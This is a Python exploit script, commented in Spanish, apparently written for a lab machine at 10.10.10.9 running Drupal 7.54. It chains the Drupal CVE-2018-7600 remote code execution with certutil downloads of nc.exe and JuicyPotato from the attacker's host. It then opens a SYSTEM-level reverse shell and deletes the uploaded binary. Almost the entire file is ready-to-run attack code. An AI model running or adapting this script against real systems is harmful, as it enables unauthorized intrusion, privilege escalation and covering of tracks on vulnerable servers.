#!/usr/bin/python3

'''
# Para descargar JuicyPotato.exe: https://github.com/ohpe/juicy-potato/releases
'''

import signal, argparse, subprocess, sys, os.path
import requests
import re
from pwn import *

# -- Variables globales

URL = "http://10.10.10.9/"

# -- Clases

# Colores
class Color:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    END = '\033[0m'

# -- Funciones

# CTRL+C
def def_handler(sig, frame):
    print(Color.RED + "\ns4al13nd0...\n" + Color.END)
    exit(0)

signal.signal(signal.SIGINT, def_handler)

# Uso del programa
# |_ https://stackoverflow.com/questions/21185526/custom-usage-function-in-argparse
def custom_usage(name=None):                                                            
    usage_default_help = f"{sys.argv[0]} [-h] [-nf NETCAT_FILENAME] [-jf JUICY_FILENAME] lhost lport"
    return usage_default_help + Color.BLUE + f'''\n\n[+] Ejemplo: {sys.argv[0]} 10.10.123.123 4433 -nf nc.exe -jf JuicyPotato.exe\n''' + Color.END

def arguments():
    parse = argparse.ArgumentParser(usage=custom_usage())
    parse.add_argument('lhost', type=str, help="Dirección IP para entablar reverse shell.")
    parse.add_argument('lport', type=int, help="Puerto para entablar la reverse shell.")
    parse.add_argument('-nf', dest="netcat_filename", type=str, default="nc.exe", help="Nombre que le tienes al binario nc.exe (default: nc.exe)")
    parse.add_argument('-jf', dest="juicy_filename", type=str, default="JuicyPotato.exe", help="Nombre que le tienes al binario JuicyPotato.exe (default: JuicyPotato.exe)")
    return parse.parse_args()

def exe_command(command):
    """
    Requests taken from: https://github.com/FireFart/CVE-2018-7600
    """

    data_get = {
        'q': 'user/password',
        'name[#post_render][]': 'passthru',
        'name[#markup]': command,
        'name[#type]': 'markup'
    }
    data_post = {
        'form_id': 'user_pass',
        '_triggering_element_name': 'name'
    }
    r = requests.post(URL, params=data_get, data=data_post)

    # Validamos si encuentra el token del formulario relacionado con la ejecución del comando
    found_token_id = re.search(r'<input type="hidden" name="form_build_id" value="(.*?)"', r.text)

    if found_token_id:
        form_token_id = found_token_id.group(1)  # Obtenemos el valor del campo encontrado

        data_get = {'q': 'file/ajax/name/#value/' + form_token_id}
        data_post = {'form_build_id': form_token_id}

        # Acá veriamos la respuesta de nuestro comando
        r = requests.post(URL, params=data_get, data=data_post)

def main(lhost, lport, juicy_filename, netcat_filename):
    p1 = log.progress("JuicyJuicy")

    # Levantamos servidor web por unos segundos
    port_web_server = "8123"
    web_server_output = subprocess.Popen(["timeout", "20", "python3", "-m", "http.server", port_web_server])

    # Subimos netcat, juicy potato y ejecutamos la revshell como NT authority system.
    p1.status(Color.BLUE + f"Subiendo {netcat_filename} al sistema..." + Color.END)
    command = f"certutil.exe -f -urlcache -split http://{lhost}:{port_web_server}/{netcat_filename} {netcat_filename}"
    exe_command(command)

    p1.status(Color.BLUE + f"Subiendo el jugo ({juicy_filename}) al sistema..." + Color.END)
    command = f"certutil.exe -f -urlcache -split http://{lhost}:{port_web_server}/{juicy_filename} {juicy_filename}"
    exe_command(command)

    p1.status(Color.BLUE + "Exprimiendo el jugo..." + Color.END)
    command = ".\%s -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a \"/c c:\inetpub\drupal-7.54\%s %s %d -e cmd.exe\"" % (juicy_filename, netcat_filename, lhost, lport)
    exe_command(command)

    p1.status(Color.BLUE + "Limpiamos la jarra del jugo..." + Color.END)
    command = f"del c:\inetpub\drupal-7.54\{juicy_filename}"
    exe_command(command)

    p1.success(Color.GREEN + "LISTOOONES" + Color.END)

# -- Inicio del programa
if __name__ == '__main__':
    args = arguments()

    # Validamos que existan los objetos en la ruta actual.
    if not os.path.exists(args.juicy_filename):
        print(Color.RED + f"\n[-] El archivo " + Color.END + args.juicy_filename + Color.RED + " no existe en tu ruta actual.\n" + Color.END)
        exit(1)
    elif not os.path.exists(args.netcat_filename):
        print(Color.RED + f"\n[-] El archivo " + Color.END + args.netcat_filename + Color.RED + " no existe en tu ruta actual.\n" + Color.END)
        exit(1)

    try:
        threading.Thread(target=main, args=(args.lhost, args.lport, args.juicy_filename, args.netcat_filename,)).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(args.lport, timeout=40).wait_for_connection()

    if shell.sock is None:
        log.failure(Color.RED + "La conexión no se ha obtenido, valida la integridad de los objetos o vuelve a intentarlo!" + Color.END)
        exit(1)

    shell.interactive()
